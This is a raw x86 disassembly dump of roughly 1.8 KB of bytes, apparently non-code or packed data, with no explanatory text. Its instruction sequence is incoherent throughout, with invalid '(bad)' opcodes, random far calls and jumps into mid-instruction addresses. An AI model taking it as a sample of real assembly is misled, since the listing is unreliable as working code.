  41c617:	sbb    al,0x11
  41c619:	std    
  41c61a:	lds    eax,FWORD PTR [esi+0x57c889e0]
  41c620:	sbb    cl,BYTE PTR [eax-0x128a3e77]
  41c626:	lea    eax,[edi-0x1]
  41c629:	xor    al,BYTE PTR [esi+0xf4a0061]
  41c62f:	mov    edx,DWORD PTR [esi]
  41c631:	adc    ebp,DWORD PTR [ecx]
  41c633:	xor    DWORD PTR [ebx+ecx*4],esp
  41c636:	sbb    al,al
  41c638:	add    al,0xa
  41c63a:	jo     0x41c5e2
  41c63c:	pushf  
  41c63d:	fild   QWORD PTR [ecx+0x577e1a3f]
  41c643:	fistp  WORD PTR ds:0x5a6c633b
  41c649:	inc    esi
  41c64a:	inc    edi
  41c64b:	fs es sbb eax,0xce480d1c
  41c652:	lock dec ebx
  41c654:	test   BYTE PTR [ebp+0x12],dh
  41c657:	jo     0x41c67e
  41c659:	aaa    
  41c65a:	fsubr  st,st(2)
  41c65c:	cld    
  41c65d:	jnp    0x41c5e0
  41c65f:	push   DWORD PTR [eax+0x5761ffb]
  41c665:	mov    ebx,0x4ad3981f
  41c66a:	gs fwait
  41c66c:	or     BYTE PTR [ecx+eax*1],bh
  41c66f:	mov    edi,0x28570062
  41c674:	dec    ebx
  41c675:	mov    eax,esp
  41c677:	nop
  41c678:	(bad)  
  41c679:	jae    0x41c641
  41c67b:	add    al,0x47
  41c67d:	fisttp DWORD PTR [edx-0x4c]
  41c680:	sbb    al,0x3a
  41c682:	les    esp,FWORD PTR [eax+0x20]
  41c685:	mov    BYTE PTR [esi],0x24
  41c688:	push   es
  41c689:	add    BYTE PTR [eax],ah
  41c68b:	ins    DWORD PTR es:[edi],dx
  41c68c:	dec    esp
  41c68d:	pushf  
  41c68e:	pop    ebp
  41c68f:	mov    al,0xbd
  41c691:	push   esp
  41c692:	sti    
  41c693:	pop    edx
  41c694:	call   0xab405ac8
  41c699:	call   0x583c:0xd8bf728
  41c6a0:	xor    al,0x39
  41c6a2:	add    BYTE PTR [esp+ecx*1+0x61],dh
  41c6a6:	xchg   ecx,eax
  41c6a7:	icebp  
  41c6a8:	fisttp QWORD PTR [ebx+0x1b8b151d]
  41c6ae:	call   ebx
  41c6b0:	pop    ebx
  41c6b1:	not    DWORD PTR [ebp-0x5d]
  41c6b4:	arpl   WORD PTR [edi+ebp*8+0xd],di
  41c6b8:	cli    
  41c6b9:	(bad)  
  41c6ba:	cmp    bl,BYTE PTR [edx]
  41c6bc:	addr16 jmp 0x8941a56
  41c6c2:	(bad)  
  41c6c3:	xchg   ebp,eax
  41c6c4:	mov    al,ds:0xd6ced202
  41c6c9:	inc    BYTE PTR [ebx]
  41c6cb:	mov    esp,0xee593890
  41c6d0:	jge    0x41c6ca
  41c6d2:	adc    eax,0xd01deafe
  41c6d7:	cmp    DWORD PTR [esi+0x9c60d8a],0xffffffac
  41c6de:	cmp    al,0x25
  41c6e0:	mov    esp,0x80bfc607
  41c6e5:	stos   BYTE PTR es:[edi],al
  41c6e6:	dec    edx
  41c6e7:	jne    0x41c6dc
  41c6e9:	mov    eax,edi
  41c6eb:	sub    eax,DWORD PTR [ebp+0x4a]
  41c6ee:	imul   eax,DWORD PTR [edi],0x7fbdf22c
  41c6f4:	imul   ebp,DWORD PTR [eax-0x73017f17],0xffffffe8
  41c6fb:	mov    BYTE PTR [ebp-0x19],al
  41c6fe:	cmp    al,0x2d
  41c700:	jne    0x41c707
  41c702:	sub    bl,ah
  41c704:	std    
  41c705:	mov    ch,0x7f
  41c707:	or     DWORD PTR [esi+eiz*2-0x7e],edi
  41c70b:	cmp    al,0x3a
  41c70d:	jne    0x41c719
  41c70f:	cs hlt 
  41c711:	and    bl,cl
  41c713:	lods   al,BYTE PTR ds:[esi]
  41c714:	jmp    0x41c6f7
  41c716:	inc    ebp
  41c717:	sahf   
  41c718:	in     eax,dx
  41c719:	mov    al,0x12
  41c71b:	loopne 0x41c6d8
  41c71d:	out    dx,eax
  41c71e:	cmp    al,0x2e
  41c720:	sub    al,BYTE PTR [esi-0x48]
  41c723:	popa   
  41c724:	outs   dx,DWORD PTR ds:[esi]
  41c725:	ins    BYTE PTR es:[edi],dx
  41c726:	mov    esp,0x7589dc2a
  41c72b:	fsub   DWORD PTR [ecx]
  41c72d:	retfw  0x8b5a
  41c731:	inc    esi
  41c732:	stos   BYTE PTR es:[edi],al
  41c733:	(bad)  
  41c735:	rcr    BYTE PTR [esi],1
  41c737:	jae    0x41c723
  41c739:	fild   DWORD PTR [eax+0xa94e77d]
  41c73f:	sub    edx,ecx
  41c741:	jae    0x41c74b
  41c743:	shr    DWORD PTR [edi-0x5],1
  41c746:	mov    al,0x3f
  41c748:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41c74a:	xchg   ecx,ebx
  41c74c:	pop    ss
  41c74d:	mov    al,0x20
  41c74f:	rep stos BYTE PTR es:[edi],al
  41c751:	sbb    esi,DWORD PTR [ebx]
  41c753:	lahf   
  41c754:	test   BYTE PTR [esi-0x16],cl
  41c757:	cmp    DWORD PTR [ebp-0x10],0xffffff9e
  41c75b:	push   edx
  41c75c:	pop    ebp
  41c75d:	gs (bad) 
  41c75f:	mov    edi,0x5a94f6bd
  41c764:	pop    ecx
  41c765:	mov    ebx,DWORD PTR [ecx+ebp*8+0x3c88c912]
  41c76c:	sub    dh,BYTE PTR [edx+eiz*1+0x3c]
  41c770:	xor    BYTE PTR [edx+0x3d],dh
  41c773:	cmp    al,0x39
  41c775:	ja     0x41c7b0
  41c777:	imul   ebx,ebx,0x10ff839b
  41c77d:	mov    al,ds:0xb60f302c
  41c782:	rol    BYTE PTR [ecx],0xc3
  41c785:	and    al,BYTE PTR [ebx]
  41c787:	in     al,0x58
  41c789:	mov    ebx,0x4f75686a
  41c78e:	fimul  DWORD PTR [esi-0xed808e]
  41c794:	push   cs
  41c795:	add    al,0xa0
  41c797:	jo     0x41c7ce
  41c799:	cld    
  41c79a:	or     al,0x6c
  41c79c:	retf   0x3fd2
  41c79f:	sbb    BYTE PTR [esp+eiz*2-0x6cf78b3d],ch
  41c7a6:	ret    
  41c7a7:	and    al,0xdf
  41c7a9:	mov    cl,al
  41c7ab:	push   edi
  41c7ac:	call   0x5d50:0x3af54e66
  41c7b3:	pop    esp
  41c7b4:	jne    0x41c7c2
  41c7b6:	lea    ebp,[ecx+0x1b]
  41c7b9:	(bad)  
  41c7ba:	div    BYTE PTR [esi+ebx*8]
  41c7bd:	mov    eax,DWORD PTR [esi]
  41c7bf:	call   0xf595:0x24ff0456
  41c7c6:	jbe    0x41c780
  41c7c8:	xchg   BYTE PTR [edi+0x6],dh
  41c7cb:	cmp    edi,esi
  41c7cd:	jns    0x41c769
  41c7cf:	out    dx,eax
  41c7d0:	mov    edi,0xef78860e
  41c7d5:	addr16 inc edi
  41c7d7:	js     0x41c808
  41c7d9:	jnp    0x41c779
  41c7db:	out    0xb1,al
  41c7dd:	pop    es
  41c7de:	add    BYTE PTR [eax+0x2b],bh
  41c7e1:	or     dh,0x27
  41c7e4:	cmp    al,0x30
  41c7e6:	pushf  
  41c7e7:	ja     0x41c7f0
  41c7e9:	push   ss
  41c7ea:	push   eax
  41c7eb:	in     al,dx
  41c7ec:	xchg   BYTE PTR [eax-0x9],ch
  41c7ef:	inc    ecx
  41c7f0:	mov    ebx,0xca3e604a
  41c7f5:	fsubr  DWORD PTR [ecx]
  41c7f7:	shl    eax,1
  41c7f9:	cld    
  41c7fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7fb:	fwait
  41c7fc:	adc    ah,BYTE PTR [edx+0x758d18bd]
  41c802:	mov    bh,0x24
  41c804:	fadd   QWORD PTR [ebx+0x72]
  41c807:	sub    cl,0xa6
  41c80a:	or     al,0x61
  41c80c:	clc    
  41c80d:	inc    esp
  41c80e:	je     0x4bd4be6c
  41c814:	imul   ebp,DWORD PTR [esi],0x1aaa2695
  41c81a:	dec    edx
  41c81b:	or     dl,BYTE PTR [ebp+0x3c]
  41c81e:	push   ebx
  41c81f:	call   0xa76a:0xb3ebf69d
  41c826:	pop    esp
  41c827:	outs   dx,BYTE PTR ds:[esi]
  41c828:	adc    BYTE PTR [ebx+0x1b],ch
  41c82b:	nop
  41c82c:	add    esi,edx
  41c82e:	mov    dh,0xf5
  41c830:	test   al,0xf5
  41c832:	call   0x2087:0xfe80301a
  41c839:	addr16 xor eax,0xf53f980
  41c83f:	test   DWORD PTR [eax-0x79],edi
  41c842:	icebp  
  41c843:	jl     0x41c802
  41c845:	iret   
  41c846:	ret    
  41c847:	sbb    eax,0xec706662
  41c84c:	sbb    ebp,DWORD PTR [esi+0x78]
  41c84f:	jbe    0x41c860
  41c851:	mov    edx,eax
  41c853:	aad    0x70
  41c855:	or     al,dh
  41c857:	jmp    0x41c8a3
  41c859:	xor    ecx,ecx
  41c85b:	inc    ecx
  41c85c:	jmp    0xacac:0x41ceaa1b
  41c863:	and    al,cl
  41c865:	jmp    0x41c8a4
  41c867:	mov    esi,0xfb77cad4
  41c86c:	inc    esi
  41c86d:	mov    bl,ch
  41c86f:	add    eax,0xc3f34be
  41c874:	add    esi,DWORD PTR [ebp-0x4]
  41c877:	aas    
  41c878:	and    DWORD PTR [ebp-0x5],ebp
  41c87b:	add    eax,0xfc427471
  41c880:	call   esi
  41c882:	pop    ebx
  41c883:	js     0x41c871
  41c885:	mov    DWORD PTR [ebx+ecx*1+0x50],edi
  41c889:	mov    bh,0xb4
  41c88b:	jl     0x41c904
  41c88d:	add    eax,0xe66b280
  41c892:	loop   0x41c8f1
  41c894:	mov    esp,0x77dc4d3b
  41c899:	sbb    BYTE PTR [edx],cl
  41c89b:	scas   eax,DWORD PTR es:[edi]
  41c89c:	js     0x41c848
  41c89e:	xchg   ecx,eax
  41c89f:	jb     0x41c88a
  41c8a1:	(bad)  
  41c8a2:	mov    ah,BYTE PTR ds:[esi]
  41c8a5:	jecxz  0x41c8db
  41c8a7:	scas   eax,DWORD PTR es:[edi]
  41c8a8:	jmp    0x70f9:0x894f6907
  41c8af:	pop    edi
  41c8b0:	ds push eax
  41c8b2:	leave  
  41c8b3:	add    DWORD PTR [ebx],0x27
  41c8b6:	loop   0x41c8ad
  41c8b8:	lods   eax,DWORD PTR ds:[esi]
  41c8b9:	out    0xa3,al
  41c8bb:	fnsave [ebp-0x77]
  41c8be:	jmp    0x26a802d
  41c8c3:	mov    bh,0x0
  41c8c5:	outs   dx,BYTE PTR ds:[esi]
  41c8c6:	mov    bl,0xdf
  41c8c8:	jl     0x41c8c5
  41c8ca:	inc    edx
  41c8cb:	dec    edx
  41c8cc:	inc    edi
  41c8cd:	je     0x41c90e
  41c8cf:	mov    bl,0x1
  41c8d1:	or     al,0x45
  41c8d3:	je     0x41c90d
  41c8d5:	mov    bl,0x2
  41c8d7:	inc    esi
  41c8d8:	je     0x41c8ec
  41c8da:	mov    bl,0x3
  41c8dc:	fcomp  QWORD PTR [edi+0x744e36f6]
  41c8e2:	hlt    
  41c8e3:	dec    ebp
  41c8e4:	jl     0x41c870
  41c8e6:	mov    bl,0x4
  41c8e8:	mov    eax,0xf7c17612
  41c8ed:	sar    BYTE PTR [edi],0x58
  41c8f0:	cmp    edx,eax
  41c8f2:	jbe    0x41c919
  41c8f4:	mov    edx,0x1b7536b2
  41c8f9:	xchg   esi,eax
  41c8fa:	push   ss
  41c8fb:	sbb    DWORD PTR [ebx+0x60],ebp
  41c8fe:	adc    eax,0xdc648a80
  41c903:	mov    edx,0x7f55890
  41c908:	dec    esi
  41c909:	cmp    eax,0x12
  41c90c:	pop    esi
  41c90d:	mov    eax,0xfb45350f
  41c912:	jecxz  0x41c95e
  41c914:	push   eax
  41c915:	loopne 0x41c8ae
  41c917:	mov    edx,esi
  41c919:	inc    esp
  41c91a:	iret   
  41c91b:	dec    ecx
  41c91c:	push   0xffffffd3
  41c91e:	sbb    ebx,eax
  41c920:	push   esi
  41c921:	(bad)  
  41c925:	ret    
  41c926:	xor    ah,al
  41c928:	and    eax,0xbab02ca
  41c92d:	rcr    DWORD PTR [eax-0x34],cl
  41c930:	lahf   
  41c931:	ds test eax,ecx
  41c934:	or     bl,dl
  41c936:	push   edi
  41c937:	or     al,0xef
  41c939:	dec    eax
  41c93a:	cli    
  41c93b:	popa   
  41c93c:	xor    BYTE PTR [edx+0x9],bh
  41c93f:	shr    DWORD PTR [eax],1
  41c941:	or     BYTE PTR [ecx+0x20097c0a],ah
  41c947:	jno    0x41c915
  41c949:	or     al,0x5e
  41c94b:	xor    eax,0x6e979cbc
  41c950:	add    dl,bh
  41c952:	(bad)  
  41c953:	mov    al,gs:0x6659781e
  41c959:	repnz bound esp,QWORD PTR [ebx+0x183b8564]
  41c960:	xchg   BYTE PTR [eax+0x401e2211],bl
  41c966:	(bad)  
  41c967:	das    
  41c968:	push   ecx
  41c969:	adc    al,0x87
  41c96b:	shl    DWORD PTR [ecx-0x71d365fd],1
  41c971:	imul   edi,DWORD PTR [eax-0x23],0x17c44640
  41c978:	aad    0x4f
  41c97a:	jne    0x41c933
  41c97c:	xor    BYTE PTR [esp+eiz*2+0x183dc7fa],dl
  41c983:	jns    0x41c9e6
  41c985:	pcmpgtb mm7,QWORD PTR [ebp+0x28]
  41c989:	sbb    eax,0x564df8ee
  41c98e:	inc    ebx
  41c98f:	mov    dh,0x9b
  41c991:	mov    al,bh
  41c993:	out    dx,eax
  41c994:	js     0x41c99d
  41c996:	scas   eax,DWORD PTR es:[edi]
  41c997:	mov    al,0xe
  41c999:	ret    
  41c99a:	(bad)  
  41c99b:	push   ss
  41c99c:	or     al,0x4f
  41c99e:	jl     0x41c9ab
  41c9a0:	mov    bh,bh
  41c9a2:	cmp    bl,0x30
  41c9a5:	dec    eax
  41c9a6:	cmp    edi,eax
  41c9a8:	jl     0x41c9f0
  41c9aa:	jmp    0x41c9de
  41c9ac:	add    ebx,ebx
  41c9ae:	mov    ebx,0xa1cb0080
  41c9b3:	(bad)  
  41c9b4:	mov    ch,0x9d
  41c9b6:	and    dh,bl
  41c9b8:	outs   dx,DWORD PTR ds:[esi]
  41c9b9:	imul   esi,DWORD PTR [ecx+0x7d759106],0xffffffc7
  41c9c0:	pop    esi
  41c9c1:	xlat   BYTE PTR ds:[ebx]
  41c9c2:	je     0x41c986
  41c9c4:	jae    0x41ca05
  41c9c6:	or     DWORD PTR [edi],0xffffff8d
  41c9c9:	xchg   ebp,eax
  41c9ca:	fldenv [eax]
  41c9cc:	iret   
  41c9cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9ce:	pop    edi
  41c9cf:	add    al,0xf0
  41c9d1:	rol    DWORD PTR [eax-0x59],cl
  41c9d4:	push   esi
  41c9d5:	xor    esi,esi
  41c9d7:	stos   BYTE PTR es:[edi],al
  41c9d8:	or     BYTE PTR [edi],ch
  41c9da:	inc    eax
  41c9db:	and    DWORD PTR [esi+edx*4+0x22],esp
  41c9df:	or     al,BYTE PTR [edi*2+0xb2db006]
  41c9e6:	hlt    
  41c9e7:	push   edi
  41c9e8:	std    
  41c9e9:	neg    edx
  41c9eb:	jmp    0x41c9f3
  41c9ed:	or     ah,ah
  41c9ef:	jo     0x41c979
  41c9f1:	loopne 0x41c99d
  41c9f3:	xchg   edx,eax
  41c9f4:	push   eax
  41c9f5:	mov    ebx,esp
  41c9f7:	out    0xb6,al
  41c9f9:	push   0x1902f40
  41c9fe:	or     al,0xec
  41ca00:	mov    BYTE PTR [ebx],dl
  41ca02:	inc    ebx
  41ca03:	dec    ecx
  41ca04:	test   eax,0xe0bfff85
  41ca09:	in     eax,dx
  41ca0a:	or     ecx,ecx
  41ca0c:	jg     0x41c9f7
  41ca0e:	dec    ebx
  41ca0f:	mov    al,BYTE PTR [ebx]
  41ca11:	stos   BYTE PTR es:[edi],al
  41ca12:	cmp    ebx,esp
  41ca14:	jne    0x41ca0e
  41ca16:	pop    eax
  41ca17:	pop    esi
  41ca18:	aas    
  41ca19:	pusha  
  41ca1a:	mov    cl,0xe0
  41ca1c:	adc    esp,0x7fa032e2
  41ca22:	xchg   esp,eax
  41ca23:	jb     0x41ca60
  41ca25:	jg     0x41ca3e
  41ca27:	inc    edx
  41ca28:	sti    
  41ca29:	mov    al,ds:0xa1fa0f7e
  41ca2e:	js     0x41ca5e
  41ca30:	hlt    
  41ca31:	mov    al,ds:0x78a0177c
  41ca36:	stc    
  41ca37:	repz mov al,ds:0x7cc7f27d
  41ca3d:	ins    DWORD PTR es:[edi],dx
  41ca3e:	lods   al,BYTE PTR ds:[esi]
  41ca3f:	pop    eax
  41ca40:	cld    
  41ca41:	mov    ds:0x75000b13,eax
  41ca46:	pop    ss
  41ca47:	es out dx,al
  41ca49:	add    bh,BYTE PTR [ebp+0x7e]
  41ca4c:	pushf  
  41ca4d:	ret    
  41ca4e:	inc    ebp
  41ca4f:	add    BYTE PTR [ebx],0x7e
  41ca52:	add    eax,0x4d7e895b
  41ca57:	je     0x41ca85
  41ca59:	push   esp
  41ca5a:	adc    al,0x27
  41ca5c:	pushf  
  41ca5d:	adc    BYTE PTR [edx],al
  41ca5f:	jb     0x41ca64
  41ca61:	std    
  41ca62:	fistp  WORD PTR [eax+0xc]
  41ca65:	fdivr  st(2),st
  41ca67:	cs ins DWORD PTR es:[edi],dx
  41ca69:	pop    eax
  41ca6a:	mov    edi,DWORD PTR [ebp-0x4]
  41ca6d:	movzx  esi,WORD PTR [ebx+0x7c]
  41ca71:	pop    es
  41ca72:	stos   DWORD PTR es:[edi],eax
  41ca73:	push   ss
  41ca74:	sub    eax,0x1a737422
  41ca79:	xor    al,0x2e
  41ca7b:	xchg   esi,eax
  41ca7c:	(bad)  
  41ca7d:	dec    esi
  41ca7e:	jmp    FWORD PTR [ebx-0x7d]
  41ca81:	lea    esi,[ecx+ecx*2-0x13dc8488]
  41ca88:	mov    ecx,0x1d1da69b
  41ca8d:	pop    ebp
  41ca8e:	outs   dx,BYTE PTR ds:[esi]
  41ca8f:	sub    eax,0x5d84d764
  41ca94:	adc    dh,bh
  41ca96:	pop    ss
  41ca97:	ins    DWORD PTR es:[edi],dx
  41ca98:	in     eax,dx
  41ca99:	fild   WORD PTR [ecx]
  41ca9b:	je     0x41caa5
  41ca9d:	add    al,0x77
  41ca9f:	or     DWORD PTR [edi],ecx
  41caa1:	mov    edi,0x7eb43b70
  41caa6:	add    dh,BYTE PTR [edx-0x73]
  41caa9:	sbb    al,0x9d
  41caab:	psubb  mm7,QWORD PTR [edx]
  41caae:	mov    edx,0x9e5d5d64
  41cab3:	sbb    ecx,DWORD PTR [eax]
  41cab5:	call   ebx
  41cab7:	lock cld 
  41cab9:	repnz mov ebp,0xe91c08af
  41cabf:	enter  0x9151,0x34
  41cac3:	in     eax,dx
  41cac4:	push   es
  41cac5:	and    al,0x7c
  41cac7:	cli    
  41cac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cac9:	push   DWORD PTR [ebx]
  41cacb:	mov    cs,WORD PTR [ecx+0x4e]
  41cace:	inc    esi
  41cacf:	dec    esi
  41cad0:	inc    ecx
  41cad1:	dec    esi
  41cad2:	lods   al,BYTE PTR ds:[esi]
  41cad3:	or     BYTE PTR [edx+0x41b74e30],al
  41cad9:	sub    DWORD PTR [ebp+0x3e],ebp
  41cadc:	jge    0x41cab4
  41cade:	push   eax
  41cadf:	jo     0x41ca8b
  41cae1:	ret    
  41cae2:	std    
  41cae3:	clc    
  41cae4:	aaa    
  41cae5:	sbb    DWORD PTR [esi+0x68d44db4],esi
  41caeb:	mov    esp,0x831d7f0c
  41caf0:	stc    
  41caf1:	std    
  41caf2:	jl     0x41cb0c
  41caf4:	ret    
  41caf5:	arpl   WORD PTR cs:[ebx+0x5a],di
  41caf9:	sbb    cl,BYTE PTR [edx+ebp*4-0x80]
  41cafd:	sbb    bh,BYTE PTR [edx]
  41caff:	mov    dh,BYTE PTR [eax]
  41cb01:	std    
  41cb02:	jnp    0x41caf9
  41cb04:	jbe    0x41cab0
  41cb06:	neg    ecx
  41cb08:	sbb    dh,bl
  41cb0a:	stos   BYTE PTR es:[edi],al
  41cb0b:	jmp    0x41cb27
  41cb0d:	jmp    0x41cb51
  41cb0f:	mov    dh,BYTE PTR [edi+edx*1-0x56]
  41cb13:	loop   0x41cb0d
  41cb15:	loopne 0x41cb71
  41cb17:	neg    ebp
  41cb19:	movlps QWORD PTR [eax-0x5499bf3c],xmm1
  41cb20:	pop    ss
  41cb21:	pop    es
  41cb22:	inc    edx
  41cb23:	clc    
  41cb24:	dec    edi
  41cb25:	cs stos DWORD PTR es:[edi],eax
  41cb27:	test   BYTE PTR [edx],bh
  41cb29:	sub    al,0x4
  41cb2b:	les    ebx,FWORD PTR [esi]
  41cb2d:	mov    bh,0x9
  41cb2f:	cli    
  41cb30:	pop    esi
  41cb31:	and    esi,ebp
  41cb33:	jp     0x41cabf
  41cb35:	gs inc esi
  41cb37:	jo     0x41cb82
  41cb39:	sbb    esi,DWORD PTR [esi-0x4c]
  41cb3c:	sub    ebp,DWORD PTR [edi]
  41cb3e:	clc    
  41cb3f:	scas   eax,DWORD PTR es:[edi]
  41cb40:	ss cmp dl,dh
  41cb43:	add    al,0xfc
  41cb45:	leave  
  41cb46:	mov    al,0x45
  41cb48:	mov    bl,BYTE PTR [ebp-0x2a]
  41cb4b:	mov    edi,0xbe4ad455
  41cb50:	cdq    
  41cb51:	mov    dl,0x4e
  41cb53:	pop    ebx
  41cb54:	inc    eax
  41cb55:	ins    DWORD PTR es:[edi],dx
  41cb56:	in     al,0x3c
  41cb58:	cli    
  41cb59:	adc    dh,BYTE PTR [edx+0x5]
  41cb5c:	mov    edx,0x1c0c0e7c
  41cb61:	mov    ds:0xeb05263f,eax
  41cb66:	sub    bl,BYTE PTR [edi-0xb]
  41cb69:	or     eax,0x74ae020f
  41cb6e:	or     cl,BYTE PTR [ecx-0x9a3b738]
  41cb74:	repz mov bl,ah
  41cb77:	inc    ebx
  41cb78:	or     edx,DWORD PTR [eax+esi*8+0x67]
  41cb7c:	test   eax,0x4b0f7449
  41cb81:	jne    0x41cb77
  41cb83:	sbb    bh,dl
  41cb85:	cmp    al,0xed
  41cb87:	stos   BYTE PTR es:[edi],al
  41cb88:	mul    DWORD PTR [edi-0x14cb93e3]
  41cb8e:	call   0xfb5fe7a3
  41cb93:	add    DWORD PTR [edx-0x3287f61d],ebp
  41cb99:	push   ss
  41cb9a:	loope  0x41cb99
  41cb9c:	dec    edx
  41cb9d:	je     0x41cbab
  41cb9f:	inc    ecx
  41cba0:	jne    0x41cb9b
  41cba2:	pop    ebp
  41cba3:	pop    esp
  41cba4:	test   ebx,0x9bf3f294
  41cbaa:	mov    bh,0xf
  41cbac:	pavgw  mm4,QWORD PTR [ecx]
  41cbaf:	or     BYTE PTR [edx],bl
  41cbb1:	repnz mov ecx,0xcb38040f
  41cbb7:	jge    0x41cbb1
  41cbb9:	stos   BYTE PTR es:[edi],al
  41cbba:	add    eax,0xbccb882e
  41cbbf:	lea    ebx,[ebx+ebx*4-0x4630830f]
  41cbc6:	mov    al,0xea
  41cbc8:	sbb    eax,0x3c7e4007
  41cbcd:	inc    eax
  41cbce:	je     0x41cbee
  41cbd0:	inc    esi
  41cbd1:	cmp    al,0x24
  41cbd3:	xchg   DWORD PTR [edx],edx
  41cbd5:	je     0x41cc17
  41cbd7:	(bad)  
  41cbd8:	or     BYTE PTR [edx],0x18
  41cbdb:	cs ins BYTE PTR es:[edi],dx
  41cbdd:	add    DWORD PTR [esi],esi
  41cbdf:	jne    0x41cb8b
  41cbe1:	fiadd  WORD PTR [edx]
  41cbe3:	or     eax,0xe243f825
  41cbe8:	xor    al,0xe2
  41cbea:	adc    al,0xa0
  41cbec:	pusha  
  41cbed:	push   esi
  41cbee:	mov    ecx,DWORD PTR [eax]
  41cbf0:	test   DWORD PTR [esi+0x5],ebx
  41cbf3:	jl     0x41cbd4
  41cbf5:	jbe    0x41cb7e
  41cbf7:	mov    edx,ss
  41cbf9:	and    al,0x2a
  41cbfb:	inc    eax
  41cbfc:	add    BYTE PTR [edx],ch
  41cbfe:	and    al,0x8
  41cc00:	and    al,0x20
  41cc02:	adc    al,0x2a
  41cc04:	and    BYTE PTR [esi+0x28f6eedd],bh
  41cc0a:	sub    BYTE PTR [ecx],ch
  41cc0c:	inc    eax
  41cc0d:	sub    eax,0x92d2433
  41cc12:	sub    ch,BYTE PTR ds:0x75242a26
  41cc18:	scas   eax,DWORD PTR es:[edi]
  41cc19:	xor    esi,DWORD PTR [edi+0x51]
  41cc1c:	sbb    cl,BYTE PTR [ecx]
  41cc1e:	and    al,0x26
  41cc20:	sub    eax,0x9d9e2d5b
  41cc25:	jae    0x41cbf6
  41cc27:	outs   dx,DWORD PTR ds:[esi]
  41cc28:	adc    BYTE PTR ds:0xe640981,ch
  41cc2e:	xor    BYTE PTR [eax],ch
  41cc30:	dec    esp
  41cc31:	xchg   esp,eax
  41cc32:	jmp    0x41ccb1
  41cc34:	sub    DWORD PTR [eax],ebp
  41cc36:	xor    ch,BYTE PTR [ecx]
  41cc38:	and    DWORD PTR [edi+0xb002ee0],0xcda058e8
  41cc42:	sub    ebp,DWORD PTR [eax-0x5e]
  41cc45:	add    BYTE PTR [edi+0x74],cl
  41cc48:	inc    esp
  41cc49:	outs   dx,BYTE PTR ds:[esi]
  41cc4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc4b:	outs   dx,DWORD PTR ds:[esi]
  41cc4c:	(bad)  ds:0x127bbe5d
  41cc52:	ins    DWORD PTR es:[edi],dx
  41cc53:	test   DWORD PTR [esi-0x6a],esp
  41cc56:	mov    edx,eax
  41cc58:	and    eax,0x1815dfa5
  41cc5d:	adc    DWORD PTR [ebp+edi*1+0x6622750d],esp
  41cc64:	test   DWORD PTR [esi+0x6],0x51a5f4af
  41cc6b:	sbb    dl,BYTE PTR [ecx]
  41cc6d:	mov    ah,0x9
  41cc6f:	cmp    DWORD PTR [esi+0x37],0xc33fa203
  41cc76:	mov    es,WORD PTR [eax+0x32]
  41cc79:	mov    BYTE PTR [ebx+0x46],0x6a
  41cc7d:	outs   dx,BYTE PTR ds:[esi]
  41cc7e:	mov    bl,bl
  41cc80:	cs je  0x41ccba
  41cc83:	rcr    BYTE PTR cs:[ebx+0x10c0693f],1
  41cc8a:	dec    ebp
  41cc8b:	mov    al,ds:0x84010f8
  41cc90:	add    bl,BYTE PTR [ebp+eax*4+0x23]
  41cc94:	out    0xee,eax
  41cc96:	fabs   
  41cc98:	push   ebx
  41cc99:	mov    ebx,0x7e8fabfe
  41cc9e:	sbb    eax,0xfcd95b38
  41cca3:	rcr    bl,cl
  41cca5:	scas   eax,DWORD PTR es:[edi]
  41cca6:	pop    esp
  41cca7:	or     al,bl
  41cca9:	fstp   DWORD PTR [ebx-0x64098223]
  41ccaf:	call   esi
  41ccb1:	jmp    0x4100:0xf645b6df
  41ccb8:	je     0x41ccc3
  41ccba:	fidiv  DWORD PTR [edi-0x20a300cd]
  41ccc0:	jne    0x41ccaa
  41ccc2:	lea    edi,[ebx+0x3]
  41ccc5:	mov    edx,0x8effc709
  41ccca:	jg     0x41cd44
  41cccc:	fwait
  41cccd:	mov    al,BYTE PTR [edx+ebp*1-0x19]
  41ccd1:	nop
  41ccd2:	shr    al,0x4
  41ccd5:	and    ah,0xf
  41ccd8:	add    ax,0x3030
  41ccdc:	push   esi
  41ccdd:	jmp    0x41cc96
  41ccdf:	pop    ebp
  41cce0:	or     bh,BYTE PTR [edx]
  41cce2:	mov    eax,es
  41cce4:	stos   BYTE PTR es:[edi],al
  41cce5:	mov    al,bh
  41cce7:	add    edi,DWORD PTR [ebp+0x8]
  41ccea:	jns    0x41ccf3
  41ccec:	jg     0x41cd29
  41ccee:	jge    0x41cd5b
  41ccf0:	adc    DWORD PTR [ebp-0x50],ebp
  41ccf3:	cmp    edi,DWORD PTR [ebp+0xc]
  41ccf6:	pushf  
  41ccf7:	or     BYTE PTR [ebx+0x277312ff],al
  41ccfd:	cmp    BYTE PTR [edi+edi*2+0x77],0xdf
  41cd02:	(bad)  
  41cd03:	cmp    eax,DWORD PTR [ebx]
  41cd05:	xor    eax,0x44c62572
  41cd0a:	or     al,0x0
  41cd0c:	dec    edi
  41cd0d:	js     0x41cd1c
  41cd0f:	dec    BYTE PTR [esi]
  41cd11:	and    eax,0xebed7739
  41cd16:	pop    ds
  41cd17:	data16 (bad) 
  41cd19:	outs   dx,BYTE PTR ds:[esi]
  41cd1a:	push   es
  41cd1b:	ja     0x41cd22
  41cd1d:	pusha  
  41cd1e:	xor    ecx,ecx
  41cd20:	jmp    0x41cd36
  41cd22:	mov    edi,0xfb19493b
  41cd27:	add    BYTE PTR [ebx],cl
  41cd29:	out    dx,al
  41cd2a:	inc    ecx
  41cd2b:	xor    BYTE PTR [ecx+esi*8-0xa],dh
  41cd2f:	push   esi
  41cd30:	or     BYTE PTR [eax],dl
  41cd32:	shr    dx,0xda
  41cd36:	mov    ?,eax
  41cd38:	jne    0x41cd91
  41cd3a:	mov    DWORD PTR [eax+0x53],ebp
  41cd3d:	add    al,bl
  41cd3f:	xchg   esp,eax
  41cd40:	out    dx,al
  41cd41:	fisub  DWORD PTR [ecx+eax*4-0x40]
  41cd45:	(bad)  
  41cd46:	xchg   ebp,eax
  41cd47:	mov    dh,0x1e
  41cd49:	adc    BYTE PTR [edi],ah
  41cd4b:	loopne 0x41cd05
  41cd4d:	scas   eax,DWORD PTR es:[edi]
  41cd4e:	fisub  DWORD PTR [ebx+0x93e0456]
  41cd54:	ror    DWORD PTR [edi],1
  41cd56:	test   BYTE PTR [edi+0xc40982c],dh
  41cd5c:	mov    ebp,0xf7ce0e4b
